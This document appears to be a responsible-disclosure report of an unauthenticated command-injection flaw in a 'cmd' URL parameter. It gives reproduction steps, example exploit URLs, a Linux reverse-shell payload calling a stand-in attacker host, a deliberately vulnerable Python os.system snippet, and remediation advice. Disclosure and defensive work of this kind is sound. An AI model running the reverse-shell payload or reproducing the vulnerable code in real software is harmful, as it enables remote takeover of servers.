# 🐞 Remote Code Execution (RCE) Vulnerability Report

---

## 📌 Title

**Unauthenticated Remote Code Execution (RCE) in `cmd` Parameter**

---

## 📝 Description

A critical Remote Code Execution (RCE) vulnerability was discovered in the `cmd` parameter of the application. The input from the user is passed directly to the server-side command interpreter without validation or sanitization, allowing arbitrary system commands to be executed remotely.

---

## 🧪 Vulnerable Endpoint

- **URL**: `https://vulnerable-website.com/execute?cmd=`
- **Method**: `GET`
- **Parameter**: `cmd`

---

## 🚨 Severity

- **CVSS Score**: 10.0 (Critical)
- **Impact**: Complete system compromise
- **Access Vector**: Remote, unauthenticated

---

## 🧪 Steps to Reproduce

1. Open a browser or Burp Suite.
2. Navigate to the vulnerable endpoint:

```
https://vulnerable-website.com/execute?cmd=whoami
```

3. Observe the server's response:

```
www-data
```

4. Test further commands:

```
https://vulnerable-website.com/execute?cmd=uname+-a
```

5. Response:

```
Linux ubuntu 5.15.0-67-generic #74-Ubuntu SMP x86_64 GNU/Linux
```

✅ These outputs confirm direct command execution on the server.

---

## 💣 Exploit Examples

### 🔍 Basic Command Execution

```bash
https://vulnerable-website.com/execute?cmd=whoami
```

### 📂 List Directory

```bash
https://vulnerable-website.com/execute?cmd=ls+-la
```

### 💻 Reverse Shell (Linux)

```bash
https://vulnerable-website.com/execute?cmd=bash+-c+'bash+-i+>&+/dev/tcp/attacker.com/4444+0>&1'
```

⚠️ For PoC only. Do not execute on production systems.

---

## 🎯 Impact

- Full server compromise
- File system access
- Credential dumping
- Lateral movement within the network
- Persistent access (backdoors)
- Sensitive data exfiltration

---

## ⚙️ Affected Components

- Improperly handled user input in server-side command functions
- Lack of input sanitization or command restrictions
- Use of insecure APIs such as `os.system`, `exec`, `popen`, etc.

---

## 🔧 Example Vulnerable Code (Python)

```python
# ❌ Vulnerable
@app.route('/execute')
def execute():
    cmd = request.args.get('cmd')
    os.system(cmd)
```

---

## 🛡️ Recommended Remediation

- Never use user input directly in system calls.
- Use a whitelist of commands if command execution is absolutely necessary.
- Use secure alternatives like subprocess with argument lists:

```python
# ✅ Secure
subprocess.run(["ls", "-la"], check=True)
```

- Implement strict input validation.
- Disable unnecessary system functionality (e.g., shell access).
- Run applications with limited OS permissions (non-root).
- Monitor for command injection attempts in logs.

---

## 🔐 Security Best Practices

- Use Web Application Firewalls (WAF)
- Perform regular code audits and pen testing
- Apply least privilege to web services
- Monitor outbound traffic for reverse shell activity
- Log all command execution attempts

---

## 🧾 References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [GTFOBins - Unix Commands](https://gtfobins.github.io/)
- [PayloadsAllTheThings - RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

## 📅 Report Date

**2025-06-17**

---

## 🧑‍💻 Reported By

- **Security Researcher**: Raghav  
- **Tools Used**: Burp Suite, Manual Testing, cURL  
- **Severity**: Critical

---

> ⚠️ **Disclaimer**: This report is part of responsible disclosure. Kindly confirm the vulnerability and acknowledge the report.